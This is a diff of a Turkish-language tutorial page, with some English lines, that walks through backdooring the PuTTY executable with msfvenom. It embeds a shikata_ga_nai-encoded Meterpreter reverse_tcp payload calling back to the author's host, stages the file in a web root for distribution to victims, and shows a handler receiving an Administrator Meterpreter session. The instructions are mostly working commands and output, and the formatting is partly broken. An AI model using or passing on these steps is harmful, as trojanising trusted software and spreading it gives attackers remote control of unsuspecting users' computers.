@@ -16,27 +16,15 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## Bir EXE Dosyası İle Arka Kapı Oluşturma
-
-
 
 Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.
 
-
-
 Bu yazıda, bir .exe dosyasının içine, Metasploit Payload yerleştirip encode etmeyi göreceğiz. Bu sayede, kodlanmış özel .exe dosyasını çalıştıran kullanıcının bilgisayarından bizim bilgisayarımıza Meterpreter oturum açılacaktır.
-
-
 
 ## Exe Dosyası İndirme
 
-
-
 Örneğimizde, `putty.exe` isimli dosyayı kullanacağız. Öncelikle bu dosyayı indirelim. Encode edilmiş .exe dosyamızı web sayfasından dağıtacağımıza göre, Kali Linux içinde sunucumuzun bulunduğu `/var/www/` klasörüne gidelim ve indirmeyi aşağıdaki komut ile başlatalım.
-
-
 ```bash
 root@kali:/var/www# wget <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>
 --2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>
@@ -58,23 +46,13 @@ Saving to: `putty.exe'
 root@kali:/var/www#
 ```
 
-
-
 Şimdi, bu indirdiğimiz `putty.exe` dosyasının içine, `msfvenom` komutunu kullanarak bir Metasploit Payload modülünü yerleştireceğiz. Yerleştireceğimiz modül, `windows/meterpreter/reverse_tcp` modülüdür ve LHOST olarak kendi IP adresimiz olan 192.168.1.101 IP adresini ayarlayacağız.
-
-
 
 Next, we use msfvenom to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.
 
-
-
 root@kali:/var/www# msfvenom -a x86 –platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe -o puttyX.exe
 
-
-
 Found 1 compatible encoders Attempting to encode payload with 3 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 326 (iteration=0) x86/shikata_ga_nai succeeded with size 353 (iteration=1) x86/shikata_ga_nai succeeded with size 380 (iteration=2) x86/shikata_ga_nai chosen with final size 380 Payload size: 380 bytes Saved as: puttyX.exe root@kali:/var/www#
-
-
 ```bash
 
 İşlem başarıyla sonuçlandığında elimizde ```puttyX.exe``` isimli kodlanmış ve içine payload yerleştirilmiş bir çalıştırılabilir dosya bulunmaktadır.
@@ -101,11 +79,7 @@ msf exploit(handler) > exploit
 [*] Starting the payload handler...
 ```
 
-
-
 Artık dinleme modülü de çalışmaktadır. Bu aşamadan sonra yapılması gereken, oluşturduğumuz .exe dosyasını web üzerinden dağıtmaktır. Herhangi bir kullanıcı bu dosyayı çalıştırdığında, otomatik olarak yerel bilgisayarımıza bağlanacak ve Meterpreter oturumu açılacaktır.
-
-
 ```bash
 > Sending stage (749056 bytes) to 192.168.1.201
 > Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011
@@ -114,7 +88,5 @@ meterpreter > getuid
 Server username: XEN-XP-SPLOIT\Administrator
 meterpreter >
 ```
-
-
 
 Bu yazıda anlatılan işlemler ve .exe dosyasının dağıtılması, göründüğünden daha uzun süre alabilir. Burada sadece işlemin mantığı açıklanmaya çalışılmıştır.
